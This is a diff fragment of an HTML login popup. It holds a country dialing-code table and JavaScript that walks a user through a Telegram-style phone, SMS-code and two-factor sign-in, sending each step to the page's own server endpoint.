+      { 'iso2': 'PY', 'name': 'Paraguay', 'codes': [{ 'code': '595', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'QA', 'name': 'Qatar', 'codes': [{ 'code': '974', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'RE', 'name': 'Réunion', 'codes': [{ 'code': '262', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'RO', 'name': 'Romania', 'codes': [{ 'code': '40', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'RS', 'name': 'Serbia', 'codes': [{ 'code': '381', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      {
+        'iso2': 'RU',
+        'name': 'Russian Federation',
+        'codes': [{ 'code': '7', 'patterns': ['XXX XXX XXXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'RW', 'name': 'Rwanda', 'codes': [{ 'code': '250', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'SA', 'name': 'Saudi Arabia', 'codes': [{ 'code': '966', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'SB', 'name': 'Solomon Islands', 'codes': [{ 'code': '677' }] },
+      { 'iso2': 'SC', 'name': 'Seychelles', 'codes': [{ 'code': '248', 'patterns': ['X XX XX XX'] }], 'patterns': [] },
+      { 'iso2': 'SD', 'name': 'Sudan', 'codes': [{ 'code': '249', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'SE', 'name': 'Sweden', 'codes': [{ 'code': '46', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'SG', 'name': 'Singapore', 'codes': [{ 'code': '65', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      {
+        'iso2': 'SH',
+        'name': 'Saint Helena',
+        'codes': [{ 'code': '247' }, { 'code': '290', 'patterns': ['XX XXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'SI', 'name': 'Slovenia', 'codes': [{ 'code': '386', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'SK', 'name': 'Slovakia', 'codes': [{ 'code': '421', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'SL', 'name': 'Sierra Leone', 'codes': [{ 'code': '232', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'SM', 'name': 'San Marino', 'codes': [{ 'code': '378' }] },
+      { 'iso2': 'SN', 'name': 'Senegal', 'codes': [{ 'code': '221', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'SO', 'name': 'Somalia', 'codes': [{ 'code': '252', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'SR', 'name': 'Suriname', 'codes': [{ 'code': '597', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'SS', 'name': 'South Sudan', 'codes': [{ 'code': '211', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      {
+        'iso2': 'ST',
+        'name': 'São Tomé &amp; Príncipe',
+        'codes': [{ 'code': '239', 'patterns': ['XX XXXXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'SV', 'name': 'El Salvador', 'codes': [{ 'code': '503', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'SX', 'name': 'Sint Maarten', 'codes': [{ 'code': '1721', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'SY', 'name': 'Syria', 'codes': [{ 'code': '963', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'SZ', 'name': 'Eswatini', 'codes': [{ 'code': '268', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      {
+        'iso2': 'TC',
+        'name': 'Turks &amp; Caicos Islands',
+        'codes': [{ 'code': '1649', 'patterns': ['XXX XXXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'TD', 'name': 'Chad', 'codes': [{ 'code': '235', 'patterns': ['XX XX XX XX'] }], 'patterns': [] },
+      { 'iso2': 'TG', 'name': 'Togo', 'codes': [{ 'code': '228', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'TH', 'name': 'Thailand', 'codes': [{ 'code': '66', 'patterns': ['X XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'TJ', 'name': 'Tajikistan', 'codes': [{ 'code': '992', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'TK', 'name': 'Tokelau', 'codes': [{ 'code': '690' }] },
+      { 'iso2': 'TL', 'name': 'Timor-Leste', 'codes': [{ 'code': '670' }] },
+      { 'iso2': 'TM', 'name': 'Turkmenistan', 'codes': [{ 'code': '993', 'patterns': ['XX XXXXXX'] }], 'patterns': [] },
+      { 'iso2': 'TN', 'name': 'Tunisia', 'codes': [{ 'code': '216', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'TO', 'name': 'Tonga', 'codes': [{ 'code': '676' }] },
+      { 'iso2': 'TR', 'name': 'Turkey', 'codes': [{ 'code': '90', 'patterns': ['XXX XXX XXXX'] }], 'patterns': [] },
+      {
+        'iso2': 'TT',
+        'name': 'Trinidad &amp; Tobago',
+        'codes': [{ 'code': '1868', 'patterns': ['XXX XXXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'TV', 'name': 'Tuvalu', 'codes': [{ 'code': '688' }] },
+      { 'iso2': 'TW', 'name': 'Taiwan', 'codes': [{ 'code': '886', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'TZ', 'name': 'Tanzania', 'codes': [{ 'code': '255', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'UA', 'name': 'Ukraine', 'codes': [{ 'code': '380', 'patterns': ['XX XXX XX XX'] }], 'patterns': [] },
+      { 'iso2': 'UG', 'name': 'Uganda', 'codes': [{ 'code': '256', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'US', 'name': 'USA', 'codes': [{ 'code': '1', 'patterns': ['XXX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'UY', 'name': 'Uruguay', 'codes': [{ 'code': '598', 'patterns': ['X XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'UZ', 'name': 'Uzbekistan', 'codes': [{ 'code': '998', 'patterns': ['XX XXX XX XX'] }], 'patterns': [] },
+      {
+        'iso2': 'VC',
+        'name': 'Saint Vincent &amp; the Grenadines',
+        'codes': [{ 'code': '1784', 'patterns': ['XXX XXXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'VE', 'name': 'Venezuela', 'codes': [{ 'code': '58', 'patterns': ['XXX XXX XXXX'] }], 'patterns': [] },
+      {
+        'iso2': 'VG',
+        'name': 'British Virgin Islands',
+        'codes': [{ 'code': '1284', 'patterns': ['XXX XXXX'] }],
+        'patterns': [],
+      },
+      {
+        'iso2': 'VI',
+        'name': 'US Virgin Islands',
+        'codes': [{ 'code': '1340', 'patterns': ['XXX XXXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'VN', 'name': 'Vietnam', 'codes': [{ 'code': '84' }] },
+      { 'iso2': 'VU', 'name': 'Vanuatu', 'codes': [{ 'code': '678' }] },
+      { 'iso2': 'WF', 'name': 'Wallis &amp; Futuna', 'codes': [{ 'code': '681' }] },
+      { 'iso2': 'WS', 'name': 'Samoa', 'codes': [{ 'code': '685' }] },
+      { 'iso2': 'XG', 'name': 'Global Mobile Satellite System', 'codes': [{ 'code': '881' }], 'hidden': true },
+      { 'iso2': 'XK', 'name': 'Kosovo', 'codes': [{ 'code': '383', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'XV', 'name': 'International Networks', 'codes': [{ 'code': '882' }, { 'code': '883' }], 'hidden': true },
+      { 'iso2': 'YE', 'name': 'Yemen', 'codes': [{ 'code': '967', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      {
+        'iso2': 'YL',
+        'name': 'Y-land',
+        'codes': [{ 'code': '42', 'prefixes': ['4', '7'] }],
+        'prefixes': [],
+        'hidden': true,
+      },
+      { 'iso2': 'ZA', 'name': 'South Africa', 'codes': [{ 'code': '27', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'ZM', 'name': 'Zambia', 'codes': [{ 'code': '260', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'ZW', 'name': 'Zimbabwe', 'codes': [{ 'code': '263', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+    ];
+
+    const togglePassword = (event, id) => {
+      event && event.preventDefault();
+      const input = getEl(id);
+      const secure = input.type === 'password';
+      input.type = secure ? 'text' : 'password';
+      getEl('2fa-mode').innerHTML = secure ? 'hide' : 'show';
+    };
+
+    const setNumberToTitle = (value) => {
+      const number = typeof value === 'string'
+        ? value
+        : (value.code.length > 1 ? value.code + ' ' : value.code) + value.phone;
+
+      document.querySelectorAll('.login_phone_field')
+      .forEach((el) => el.innerHTML = number);
+    };
+
+    const AppStateEnum = Object.freeze({
+      PHONE: 'phone',
+      CODE: 'code',
+      '2FA': '2fa',
+    });
+
+    let AppState = AppStateEnum.PHONE;
+
+    const hideElById = (id) => getEl(id).classList.add('hide');
+    const showElById = (id) => getEl(id).classList.remove('hide');
+    const getElValueById = (id) => getEl(id).value;
+
+    const showUserError = (error_text) => {
+      switch (AppState) {
+        case AppStateEnum.PHONE: {
+          getEl('login-phone-code-textfield').classList.add('is-invalid');
+          getEl('login-phone-textfield').classList.add('is-invalid');
+          getEl('login-phone-alert').innerHTML = error_text;
+          break;
+        }
+        case AppStateEnum.CODE: {
+          getEl('login-code-textfield').classList.add('is-invalid');
+          getEl('login-code-alert').innerHTML = error_text;
+          break;
+        }
+        case AppStateEnum['2FA']: {
+          getEl('login-2fa-textfield').classList.add('is-invalid');
+          getEl('login-2fa-alert').innerHTML = error_text;
+          break;
+        }
+      }
+    }
+
+    const hideUserError = () => {
+      switch (AppState) {
+        case AppStateEnum.PHONE: {
+          getEl('login-phone-code-textfield').classList.remove('is-invalid');
+          getEl('login-phone-textfield').classList.remove('is-invalid');
+          getEl('login-phone-alert').innerHTML = '';
+          break;
+        }
+        case AppStateEnum.CODE: {
+          getEl('login-code-textfield').classList.remove('is-invalid');
+          getEl('login-code-alert').innerHTML = '';
+          break;
+        }
+        case AppStateEnum['2FA']: {
+          getEl('login-2fa-textfield').classList.remove('is-invalid');
+          getEl('login-2fa-alert').innerHTML = '';
+          break;
+        }
+      }
+    }
+
+    const openPhonePage = () => {
+      hideUserError();
+
+      hideElById('2fa-form');
+      hideElById('code-form');
+      showElById('phone-form');
+
+      AppState = AppStateEnum.PHONE;
+    };
+
+    const openCodePage = () => {
+      hideUserError();
+
+      hideElById('phone-form');
+      hideElById('2fa-form');
+      // cleanup
+      const input = getEl('login-code');
+      input.value = '';
+      showElById('code-form');
+      input.focus();
+
+      AppState = AppStateEnum.CODE;
+    };
+
+    const open2FaPage = () => {
+      hideUserError();
+
+      hideElById('phone-form');
+      hideElById('code-form');
+      // cleanup
+      const input = getEl('login-2fa');
+      if (input.type === 'text') {
+        togglePassword(null, 'login-2fa')
+      }
+      input.value = '';
+      showElById('2fa-form');
+      input.focus();
+
+      AppState = AppStateEnum['2FA'];
+    };
+
+    function sendCode(event) {
+      
+      event && event.preventDefault();
+      hideUserError();
+
+      const code = getElValueById('login-phone-code');
+      const phone = getElValueById('login-phone');
+
+      ajax('', {
+        phone: (code + phone).replace(/[^0-9]+/g, '')
+      }, function (res, req) {
+        waitCode();
+      }, function (err, req) {
+        // https://core.telegram.org/method/auth.sendCode#possible-errors
+        switch (err.id) {
+        case 'FLOOD_WAIT': // 420
+          const sec = +err.detail.slice(err.id.length+1);
+          const exp = new Date(Date.now()+(sec*1000));
+          const dts = exp.toLocaleString(
+            window.navigator.languages, {
+              dateStyle: 'short',
+              timeStyle: 'short'
+          });
+          err.message = 'Retry after '+dts;
+          break;
+        case 'API_ID_INVALID': // 400
+          err.message = 'Invalid API ID';
+          break;
+        case 'API_ID_PUBLISHED_FLOOD': // 400
+          err.message = 'This API ID is already published';
+          break;
+        case 'AUTH_RESTART': // 500
+          cancelCode(event);
+          showUserError('Restart the authorization process');
+          return false;
+        case 'PHONE_NUMBER_APP_SIGNUP_FORBIDDEN':
+          err.message = 'You can\'t sign up using this app';
+          break;
+        case 'PHONE_NUMBER_BANNED': // 400
+          err.message = 'The provided phone number is banned from telegram';
+          break;
+        case 'PHONE_NUMBER_FLOOD': // 400
+          err.message = 'You asked for the code too many times';
+          break;
+        case 'PHONE_NUMBER_INVALID': // 406
+          err.message = 'The phone number is invalid';
+          break;
+        case 'PHONE_PASSWORD_FLOOD': // 406
+          err.message = 'You have tried logging in too many times';
+          break;
+        case 'PHONE_PASSWORD_PROTECTED': // 400
+          err.message = 'This phone is password protected';
+          break;
+        case 'SMS_CODE_CREATE_FAILED': // 400
+          err.message = 'An error occurred while creating the SMS code';
+          break;
+        case 'SESSION_PASSWORD_NEEDED': // 406
+          open2FaPage();
+          return false;
+        default:
+        }
+        showUserError(err.message||err.detail||'Server error');
+      });
+      return false;
+    }
+
+    function signIn(event) {
+      event && event.preventDefault();
+      
+      const code = getElValueById('login-code');
+      hideUserError();
+
+      ajax('', {
+        code: code,
+      }, function (res, req) {
+        window.opener.postMessage(
+          {status:'success'}, '*'
+        );
+        window.close(); // 
+      }, function (err, req) {
+        // https://core.telegram.org/method/auth.signIn#possible-errors
+        switch (err.id) {
+        case 'PHONE_CODE_EMPTY': // 400
+          err.message = 'The phone code is missing';
+          break;
+        case 'PHONE_CODE_EXPIRED': // 400
+          err.message = 'The phone code you provided has expired';
+          break;
+        case 'PHONE_CODE_INVALID': // 400
+          err.message = 'The provided phone code is invalid';
+          break;
+        case 'PHONE_NUMBER_INVALID': // 400
+          err.message = 'The phone number is invalid';
+          break;
+        case 'PHONE_NUMBER_UNOCCUPIED': // 400
+          err.message = 'The phone number is not yet being used';
+          break;
+        case 'SESSION_PASSWORD_NEEDED': // 406
+          open2FaPage();
+          return false;
+        case 'SIGN_IN_FAILED': // 500
+          err.message = 'Failure while signing in';
+          break;
+        default:
+        }
+        showUserError(err.message||err.detail||'Server error')
+      });
+      return false;
+    }
+
+    function send2FA(event) {
+      event && event.preventDefault();
+
+      const pass = getElValueById('login-2fa');
+      hideUserError();
+
+      ajax('', {
+        "2fa": pass,
+      }, function (res, req) {
+        window.opener.postMessage(
+          {status:'success'}, '*'
+        );
+        window.close(); // 
+      }, function (err, req) {
+        // https://core.telegram.org/method/auth.checkPassword#possible-errors
+        switch (err.id) {
+        case 'PASSWORD_HASH_INVALID': // 400
+          err.message = 'Invalid password';
+          break;
+        case 'SRP_ID_INVALID': // 400
+          err.message = 'Invalid SRP ID provided';
+          break;
+        case 'SRP_PASSWORD_CHANGED': // 400
+          err.message = 'Password has changed';
+          break;
+        default:
+        }
+        showUserError(err.message||err.detail||'Server error')
+      });
+      return false;
+    }
+
+    function waitCode() {
+      
+      const code = getElValueById('login-phone-code');
+      const phone = getElValueById('login-phone');
+
+      setNumberToTitle({ code, phone });
+
+      openCodePage();
+    }
+
+    function cancelCode(event) {
+      event && event.preventDefault();
+
+      ajax('', {cancel:true});
+
+      setNumberToTitle('');
+      openPhonePage();
+
+      getEl('login-phone').focus();
+
+      return false;
+    }
+
+    function loginCancel(e) {
+      switch (AppState) {
+        case AppStateEnum.PHONE:
+          cancelCode(e);
+          window.close();
+          break;
+        case AppStateEnum.CODE:
+        case AppStateEnum['2FA']:
+          cancelCode(e);
+          openPhonePage();
+          break;
+      }
+    }
+
+    addEventListener('beforeunload', (event) => {
+      event && event.preventDefault();
+
+      const message = {
+        status: 'error',
+        detail: 'canceled'
+      }
+      window.opener.postMessage(message, '*');
+
+      return null;
+    }, false);
+
+    inputFormatPhoneInit('UA', '', 'en');
+
+    initRipple();
+  </script>
+</body>
+
+</html>
